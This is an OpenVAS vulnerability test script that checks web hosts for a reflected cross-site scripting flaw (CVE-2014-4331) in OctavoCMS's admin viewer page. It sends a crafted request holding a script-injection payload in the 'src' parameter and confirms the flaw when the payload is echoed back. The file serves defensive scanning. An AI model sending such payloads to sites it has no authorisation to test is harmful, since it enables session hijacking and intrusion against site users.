###############################################################################
# OpenVAS Vulnerability Test
#
# OctavoCMS 'src' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804697");
  script_version("2020-08-24T15:18:35+0000");
  script_cve_id("CVE-2014-4331");
  script_bugtraq_id(68469);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2014-07-30 12:51:13 +0530 (Wed, 30 Jul 2014)");
  script_name("OctavoCMS 'src' Parameter Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with OctavoCMS and is prone to cross-site scripting
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Input passed via the HTTP GET parameter 'src' to '/admin/viewer.php'
  script is not properly sanitised before returning to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"OctavoCMS version 3.1.1 and other versions also.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/94401");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127404");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);

if(!http_can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/octavocms", "/cms", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin/login.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if ("Octavo Content Management<" >< rcvRes)
  {
    url = dir + '/admin/viewer.php?src="><script>alert(document.cook' +
          'ie)</script>';

    ## Send request and Confirm exploit worked by checking the response
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
           pattern:"<script>alert\(document.cookie\)</script>",
           extra_check:"Octavo Content Management<"))
    {
      security_message(http_port);
      exit(0);
    }
  }
}

exit(99);
